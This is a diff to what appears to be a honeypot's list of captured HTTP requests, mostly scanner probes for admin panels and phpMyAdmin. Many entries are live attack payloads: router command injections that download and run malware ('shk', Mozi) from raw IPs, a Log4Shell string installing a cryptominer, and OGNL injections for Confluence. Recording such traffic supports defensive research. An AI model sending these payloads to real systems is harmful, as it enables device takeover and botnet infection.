@@ -98,6 +98,8 @@ method GET url /mysql/pMA/index.php?lang=en
 method GET url /script
 method GET url /webdb/
 method GET url /.ghauri
+method GET url /ads.txt
+method GET url /app-ads.txt
 method GET url /version
 method GET url /sqlweb/
 method GET url /websql/
@@ -325,6 +327,7 @@ method GET url /admin/phpMyAdmin/index.php?lang=en
 method GET url /administrator/phpmyadmin/index.php?lang=en
 method GET url /administrator/phpMyAdmin/index.php?lang=en
 method GET url /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en
+method GET url /sellers.json
 method GET url /manager/html
 method GET url /manager/text/list
 method GET url /phpmanager/
@@ -363,6 +366,7 @@ method GET url /cgi-bin/authLogin.cgi
 method GET url /cgi-bin/orospucoc.cgi?user=messagebus&passwd=&cmd=15&system=dW5hbWUJLW0=
 method GET url /cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=dW5hbWUJLW0=
 method GET url /cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=cm0JLXJmCWxvbAl8CXdnZXQJLU8tCWh0dHA6Ly85NC4xNTYuOC4yNDQvbG9sfHNo
+method GET url /cgi-bin/luci/;stok=/locale
 method GET url /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.17.171%3A88%2Ft%7Csh%3B%60)
 method GET url /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+/tmp;+rm+-rf+shk;+wget+http://103.14.226.142/shk;+chmod+777+shk;+./shk+tplink;+rm+-rf+shk)
 method GET url /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`cd+/tmp;+rm+-rf+shk;+wget+http://103.163.214.97/shk;+chmod+777+shk;+./shk+tplink;+rm+-rf+shk`)
@@ -374,12 +378,14 @@ method GET url /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=
 method GET url /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60)
 method GET url /remote/login
 method GET url /showLogin.cc
+method GET url /owa/auth/x.js
 method GET url /WebInterface/
 method GET url /server-status
 method GET url /image/lgbg.jpg
 method GET url /Res/login.html
 method GET url /Portal0000.htm
 method GET url /Portal/Portal.mwsl
+method GET url /welcome.action
 method GET url /actuator/health
 method GET url /api/sonicos/tfa
 method GET url /api/sonicos/auth
@@ -442,6 +448,7 @@ method GET url /?XDEBUG_SESSION_START=phpstorm
 method GET url /debug/default/view?panel=config
 method GET url /nice%20ports%2C/Tri%6Eity.txt%2ebak
 method GET url /sitecore/shell/sitecore.version.xml
+method GET url /setup/setupadministrator-start.action
 method GET url /Telerik.Web.UI.WebResource.axd?type=rau
 method GET url /securityRealm/user/admin/search/index?q=a
 method GET url /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000
@@ -455,6 +462,7 @@ method GET url /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
 method GET url /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application
 method GET url /.most/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=cHMJfAlncmVwCW15ZGxpbms=
 method GET url /s/3333e2530313e2232313e21393/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties
+method GET url /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=0&cache2lz5VkPYiq02RCXMreMPc35SR3k
 method GET url /index.php?lang=../../../../../../../../tmp/index1
 method GET url /index.php?lang=../../../../../../../../var/tmp/index1
 method GET url /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php
@@ -466,16 +474,18 @@ method GET url /public/index.php?s=/index/\think\app/invokefunction&function=cal
 method GET url /t%28%27$%7B$%7Benv:NaN:-j%7Dndi$%7Benv:NaN:-:%7D$%7Benv:NaN:-l%7Ddap$%7Benv:NaN:-:%7D//95.214.55.202:3306/TomcatBypass/Command/Base64/a2lsbGFsbCAtOSBwYXJhaXNvLng4Njsga2lsbGFsbCAtOSB4bXJpZzsgY3VybCAtcyAtTCBodHRwOi8vZG93bmxvYWQuYzNwb29sLm9yZy94bXJpZ19zZXR1cC9yYXcvbWFzdGVyL3NldHVwX2MzcG9vbF9taW5lci5zaCB8IExDX0FMTD1lbl9VUy5VVEYtOCBiYXNoIC1zIDQ4Nnhxdzd5c1hkS3c3UmtWelQ1dGRTaUR0RTZzb3hVZFlhR2FHRTFHb2FDZHZCRjdyVmc1b01YTDlwRngzckIxV1VDWnJKdmQ2QUhNRldpcGVZdDVlRk5VeDlwbUdO%7D%27%29
 method GET url http://azenv.net/
 method GET url http://azenv.net/url?key=xxx
+method GET url http://example.com/
 method GET url http://httpbin.org/ip
 method GET url http://www.google.com
 method GET url http://5.188.210.227/echo.php
 method GET url http://www.msftncsi.com/ncsi.txt
 method GET url http://api.ipify.org/?format=json
 method GET url http://v4.ident.me?Z71698474351Q1
+method GET url http://90.151.171.106/ip.php?Z71698474351Q1
+method GET url http://fingerprints.bablosoft.com/ip?Z71698474351Q1
 method GET url http://uplo.ad/?v=1&ip=<ip_address>&port=8080
 method GET url http://141.98.7.179/a.php?pro=<ip_address>:8080
 method GET url http://45.14.244.249/a.php?pro=<ip_address>:8080
-method GET url http://fingerprints.bablosoft.com/ip?Z71698474351Q1
 method GET url http://<ip_address>:8080/php/scripts/setup.php
 method GET url http://<ip_address>:8080/pma/scripts/setup.php
 method GET url http://<ip_address>:8080/phpma/scripts/setup.php
@@ -521,9 +531,13 @@ method GET url http://<ip_address>:8080/sqlweb/scripts/setup.php
 method GET url http://<ip_address>:8080/webadmin/scripts/setup.php
 method GET url http://<ip_address>:8080/webdb/scripts/setup.php
 method GET url http://<ip_address>:8080/websql/scripts/setup.php
+method GET url /autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com
+method GET url /autodiscover/autodiscover.json?@test.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@test.com
 method GET url /%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22nslookup%20cm65lhb332t11umgfcmgezufjihurspg3.oast.fun%22%29%7D/
 method GET url /%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22nslookup%20cmp9f2b332t1tgj4mbtggcww5t8zhaoua.oast.site%22%29%7D/
 method GET url /%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22nslookup%20cmp9f2b332t1tgj4mbtg4yc77p8seuucb.oast.site%22%29%7D/
+method GET url /%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22nslookup%20crhk7qdmb1a0vsi25n40igznuqas5sjst.oast.online%22%29%7D/
+method GET url /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/
 method GET url /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
 method GET url /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://117.213.43.196:36023/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
 method PRI url *
@@ -569,6 +583,7 @@ method POST url /wp-login.php
 method POST url /wordpress/wp-login.php
 method POST url /rpcform/login
 method POST url /tmUnblock.cgi
+method POST url /dologin.action
 method POST url /mgmt/tm/util/bash
 method POST url /scripts/WPnBr.dll
 method POST url /users?page=&size=5
@@ -581,13 +596,19 @@ method POST url /goform/set_LimitClient_cfg
 method POST url /cgi-bin-igd/netcore_set.cgi
 method POST url /cgi-bin/luci/;stok=/locale?form=country
 method POST url /Autodiscover/Autodiscover.xml
+method POST url /autodiscover/autodiscover.json
 method POST url /template/custom/content-editor
 method POST url /templates/editor-preload-container
+method POST url /setup/setupadministrator.action
 method POST url /pages/doenterpagevariables.action
 method POST url /pages/createpage.action?spaceKey=myproj
+method POST url /pages/templates2/viewpagetemplate.action
 method POST url /pages/createpage-entervariables.action
 method POST url /pages/createpage-entervariables.action?SpaceKey=x
-method POST url /pages/templates2/viewpagetemplate.action
+method POST url /wiki/pages/createpage-entervariables.action
+method POST url /wiki/pages/createpage-entervariables.action?SpaceKey=x
+method POST url /confluence/pages/createpage-entervariables.action
+method POST url /confluence/pages/createpage-entervariables.action?SpaceKey=x
 method POST url /lib/phpunit/Util/PHP/eval-stdin.php
 method POST url /lib/phpunit/src/Util/PHP/eval-stdin.php
 method POST url /lib/phpunit/phpunit/Util/PHP/eval-stdin.php
@@ -608,10 +629,7 @@ method POST url /phpunit/Util/PHP/eval-stdin.php%20/lib/phpunit/phpunit/src/Util
 method POST url /vendor/phpunit/Util/PHP/eval-stdin.php%20/phpunit/phpunit/src/Util/PHP/eval-stdin.php
 method POST url /lib/phpunit/phpunit/Util/PHP/eval-stdin.php%20/lib/phpunit/src/Util/PHP/eval-stdin.php
 method POST url /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php%20/vendor/phpunit/src/Util/PHP/eval-stdin.php
-method POST url /confluence/pages/createpage-entervariables.action
-method POST url /confluence/pages/createpage-entervariables.action?SpaceKey=x
-method POST url /wiki/pages/createpage-entervariables.action
-method POST url /wiki/pages/createpage-entervariables.action?SpaceKey=x
+method POST url /webtools/control/forgotPassword/%2e/%2e/ProgramExport
 method HEAD url /
 method HEAD url http://www.google.com
 method HEAD url http://112.124.42.80:63435/
@@ -620,14 +638,17 @@ method CONNECT url 1.1.1.1:443
 method CONNECT url 45.61.137.126:7227
 method CONNECT url 45.61.136.175:7227
 method CONNECT url 49.13.151.148:2241
+method CONNECT url 90.151.171.106:443
 method CONNECT url 185.65.245.140:7227
 method CONNECT url 193.149.189.126:7227
 method CONNECT url rev.pm:443
 method CONNECT url api.rev.pm:443
 method CONNECT url github.com:443
-method CONNECT url v4.ident.me:443
+method CONNECT url example.com:443
 method CONNECT url ecaravan.gr:443
+method CONNECT url v4.ident.me:443
 method CONNECT url zaloweb.ink:443
+method CONNECT url dev.flood.at:443
 method CONNECT url google.com:443
 method CONNECT url www.google.com:80
 method CONNECT url www.google.com:443
@@ -646,6 +667,5 @@ method CONNECT url fingerprints.bablosoft.com:443
 method OPTIONS url /
 method OPTIONS url sip:nm
 method SSTP_DUPLEX_POST url /sra_{BA195980-CD49-458b-9E23-C84EE0ADCD75}/
-
 
 
